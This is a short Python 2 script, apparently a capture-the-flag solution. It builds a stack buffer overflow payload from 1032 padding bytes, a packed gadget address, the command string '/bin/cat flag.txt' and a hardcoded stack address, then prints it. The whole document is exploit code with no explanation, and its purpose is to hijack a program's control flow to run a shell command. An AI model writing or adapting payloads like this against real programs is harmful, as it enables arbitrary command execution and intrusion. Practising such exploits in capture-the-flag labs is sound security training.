import struct          
g1 = 0x4006d1


sys_add =0x7fffffffda40

payload = 1032*'A'+ struct.pack("<Q",g1) + "/bin/cat flag.txt" + struct.pack("<Q",sys_add)
print payload

